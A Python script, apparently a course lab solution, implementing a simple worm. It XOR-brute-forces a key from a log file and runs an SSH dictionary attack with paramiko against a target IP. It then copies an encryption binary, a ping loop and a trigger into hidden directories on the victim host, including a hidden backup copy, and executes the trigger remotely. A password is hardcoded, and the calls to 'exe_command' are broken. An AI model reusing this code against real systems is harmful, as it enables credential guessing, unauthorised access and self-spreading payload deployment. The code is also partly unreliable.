#!/usr/bin/env python3
import os
import paramiko

def CrackMe():
    crack = open('/home/victim/Public/.Simple_Worm/crack_me.log').read()
    for i in range(256):
        result = ''
        for c in crack:
            result += chr(ord(c) ^ i)
        if 'flag' in result:
            key = i
            print(key)
            break
    plain = 'Verification_flag:0616018-0616100'
    cipher = ''
    for p in plain:
        cipher += chr(key ^ ord(p))
    open('/home/victim/Public/.Simple_Worm/task1_result.log', 'w').write(cipher)

def DictionaryAttack(ip):
    password = ''
    info = [d.split(':')[1].strip() for d in open('/home/victim/materials/attacker.dat').readlines()][:-1] + ['@', '_']
    for i in info:
        if password != '':
            break
        j = 0
        while j < len(info):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(ip, 22, username='attacker', password=i+info[j], timeout=1000, banner_timeout=1000, auth_timeout=1000)
                client.exe_command('mkdir /home/attacker/Public/.Simple_Worm')
                password = i+info[j]
                print(password)
                break
            except KeyboardInterrupt:
                exit(0)
            except paramiko.AuthenticationException:
                pass
            except:
                j -= 1
            j += 1
    return password

def Hiding(ip, password):
    t = paramiko.Transport((ip, 22))
    t.connect(username='attacker', password=password)
    sftp = paramiko.SFTPClient.from_transport(t)
    sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Public/.Simple_Worm/RSA_Encrypt')
    sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Public/.Simple_Worm/Loop_ping')
    sftp.put('/home/victim/Public/.Simple_Worm/Loop/task1_result.log', '/home/attacker/Public/.Simple_Worm/task1_result.log')
    sftp.put('/home/victim/Public/.Simple_Worm/Loop/trigger', '/home/attacker/Public/.Simple_Worm/trigger')
    sftp.put('/home/victim/materials/RSA/RSA_Encrypt', '/home/attacker/Desktop/.Backup/RSA_Encrypt')
    sftp.put('/home/victim/Public/.Simple_Worm/Loop/Loop_ping', '/home/attacker/Desktop/.Backup/Loop_ping')
    sftp.put('/home/victim/Public/.Simple_Worm/Loop/task1_result.log', '/home/attacker/Desktop/.Backup/task1_result.log')
    sftp.put('/home/victim/Public/.Simple_Worm/Loop/trigger', '/home/attacker/Desktop/.Backup/trigger')
    t.close()

def Trigger(ip, password): 
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, 22, username='attacker', password=password, timeout=1000, banner_timeout=1000, auth_timeout=1000)
    client.exe_command('/home/attacker/Public/.Simple_Worm/trigger')

Hiding('127.0.0.1', 'YH0228')
